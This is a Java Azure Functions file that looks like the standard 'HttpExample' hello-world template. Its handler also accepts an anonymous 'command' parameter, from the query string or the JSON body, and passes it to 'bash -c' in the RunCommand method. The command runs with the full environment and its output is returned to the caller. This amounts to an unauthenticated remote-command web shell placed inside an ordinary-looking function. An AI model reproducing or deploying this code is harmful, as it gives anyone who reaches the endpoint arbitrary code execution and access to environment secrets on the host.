package com.function;

import com.microsoft.azure.functions.ExecutionContext;
import com.microsoft.azure.functions.HttpMethod;
import com.microsoft.azure.functions.HttpRequestMessage;
import com.microsoft.azure.functions.HttpResponseMessage;
import com.microsoft.azure.functions.HttpStatus;
import com.microsoft.azure.functions.annotation.AuthorizationLevel;
import com.microsoft.azure.functions.annotation.FunctionName;
import com.microsoft.azure.functions.annotation.HttpTrigger;

import java.util.Map;
import java.util.Optional;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Azure Functions with HTTP Trigger.
 */
public class Function {
    /**
     * This function listens at endpoint "/api/HttpExample". Two ways to invoke it using "curl" command in bash:
     * 1. curl -d "HTTP Body" {your host}/api/HttpExample
     * 2. curl "{your host}/api/HttpExample?name=HTTP%20Query"
     */
    @FunctionName("HttpExample")
    public HttpResponseMessage run(
            @HttpTrigger(
                name = "req",
                methods = {HttpMethod.GET, HttpMethod.POST},
                authLevel = AuthorizationLevel.ANONYMOUS)
                HttpRequestMessage<Optional<String>> request,
            final ExecutionContext context) {
        context.getLogger().info("Java HTTP trigger processed a request.");

        // Parse query parameters - name
        String name = request.getQueryParameters().get("name");
        if (name == null) {
            try {
                String requestBody = request.getBody().orElse("");
                ObjectMapper mapper = new ObjectMapper();
                JsonNode jsonNode = mapper.readTree(requestBody);
                name = jsonNode.get("name").asText();
            } catch (Exception e) {
                context.getLogger().info("Failed to parse request body for name: " + e.getMessage());
            }
        }
        
        // Parse query parameters - command
        String query = request.getQueryParameters().get("command");
        if (query == null) {
            try {
                String requestBody = request.getBody().orElse("");
                ObjectMapper mapper = new ObjectMapper();
                JsonNode jsonNode = mapper.readTree(requestBody);
                query = jsonNode.get("command").asText();
            } catch (Exception e) {
                context.getLogger().info("Failed to parse request body for command: " + e.getMessage());
            }
        }

        if (query != null) {
            return request.createResponseBuilder(HttpStatus.OK).body(RunCommand(query)).build();
        }

        if (name != null) {
            return request.createResponseBuilder(HttpStatus.OK).body("Hello, " + name).build();
        } else {
            String currentTime = java.time.LocalDateTime.now().toString();
            String currentZone = java.time.ZoneId.systemDefault().toString();
            return request.createResponseBuilder(HttpStatus.OK)
                .body("Executed trigger at time " + currentTime + ", timezone: " + currentZone + ".\nTZ: " + System.getenv("TZ"))
                .build();
        }
    }

    private String RunCommand(String command) {
        StringBuilder output = new StringBuilder();
        Process process = null;
        ProcessBuilder processBuilder = null;
        Map<String, String> environment = null;
        try {
            processBuilder = new ProcessBuilder("bash", "-c", command);
            environment = processBuilder.environment();
            environment.putAll(System.getenv());
            process = processBuilder.start();

            boolean finished = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            if (finished) {
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getErrorStream()));
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            } else {
            process.destroy();
            output.append("Command timed out.");
            }
        } catch (Exception e) {
            output.append("Exception occurred: ").append(e.getMessage());
        } finally {
            if (process != null) {
            process.destroy();
            }
        }
        return output.toString();
    }
}
